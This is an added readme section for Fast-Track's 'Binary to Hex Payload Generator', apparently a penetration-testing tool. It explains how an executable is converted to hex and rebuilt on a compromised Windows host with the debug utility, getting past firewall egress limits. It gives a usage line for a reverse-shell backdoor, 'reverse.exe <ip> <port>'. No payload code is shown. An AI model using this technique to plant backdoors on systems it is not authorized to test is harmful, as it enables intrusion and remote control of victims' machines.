@@ -1,0 +1,36 @@
+***********************************************************************
+Binary to Hex Payload Generator
+***********************************************************************
+
+Requirements: None
+
+To put it simply, in order for a lot of attacks to work you need a 
+connection back to get your malicious payload back on the server you
+just popped right? This might be a netcat, or a variant that allows
+you a interactive shell through the egress points in a firewall. Alot
+of times this can be a pain in the rear to get a stable connection to 
+download something off. A lot of the techniques out there could be TFTP,
+FTP, HTTP GET's, and various other connections that rely off of a stable
+egress connection in order to grab the payload...
+
+In the binary to hex payload generator, you can either use one that
+we have built into Fast-Track, simply copy and paste the output line
+by line, and it will create a reverse.exe file for you. To use this
+backdoor simply type:
+
+reverse.exe <ip> <port> (thanks IllWill)
+
+What this tool does for you is convert a normal windows executable
+and uses the windows debug feature to compile an executable for you
+through echoing into a file. You can use your own (generally the
+metasploit payload generator works great). 
+
+The reason for this being so useful is now we don't have to connect
+back and get our payload relying off of various other protocols..
+Just more of a simple step and can just copy and paste the stuff
+into a windows command prompt, and we're done.
+
+This type of attack has already been implemented in the binary payload
+SQL Injector tool.
+
+***********************************************************************
